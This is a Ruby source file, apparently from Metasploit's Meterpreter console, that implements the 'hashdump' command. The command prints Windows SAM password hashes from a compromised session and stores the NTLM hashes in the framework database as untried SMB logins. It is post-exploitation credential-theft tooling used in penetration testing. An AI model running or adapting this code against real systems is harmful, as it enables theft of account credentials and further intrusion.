# -*- coding: binary -*-

require 'rex/post/meterpreter'

module Rex
  module Post
    module Meterpreter
      module Ui
        ###
        #
        # The password database portion of the privilege escalation extension.
        #
        ###
        class Console::CommandDispatcher::Priv::Passwd

          Klass = Console::CommandDispatcher::Priv::Passwd

          include Console::CommandDispatcher

          #
          # List of supported commands.
          #
          def commands
            {
              'hashdump' => 'Dumps the contents of the SAM database'
            }
          end

          #
          # Name for this dispatcher.
          #
          def name
            'Priv: Password database'
          end

          #
          # Displays the contents of the SAM database
          #
          def cmd_hashdump(*_args)
            client.priv.sam_hashes.each do |user|
              print_line(user.to_s)
              if shell.client.platform == 'windows' && !shell.framework.nil?
                report_creds(user)
              end
            end

            return true
          end

          def report_creds(user_data)
            user = user_data.user_name
            pass = "#{user_data.lanman}:#{user_data.ntlm}"
            return if (user.empty? || pass.include?('aad3b435b51404eeaad3b435b51404ee'))

            # Assemble data about the credential objects we will be creating
            credential_data = {
              origin_type: :session,
              post_reference_name: 'hashdump',
              private_data: pass,
              private_type: :ntlm_hash,
              session_id: client.db_record.id,
              username: user,
              workspace_id: shell.framework.db.workspace.id
            }

            credential_core = shell.framework.db.create_credential(credential_data)

            # Assemble the options hash for creating the Metasploit::Credential::Login object
            login_data = {
              core: credential_core,
              status: Metasploit::Model::Login::Status::UNTRIED,
              address: ::Rex::Socket.getaddress(client.sock.peerhost, true),
              port: 445,
              service_name: 'smb',
              protocol: 'tcp',
              workspace_id: shell.framework.db.workspace.id
            }

            shell.framework.db.create_credential_login(login_data)
          end
        end
      end
    end
  end
end
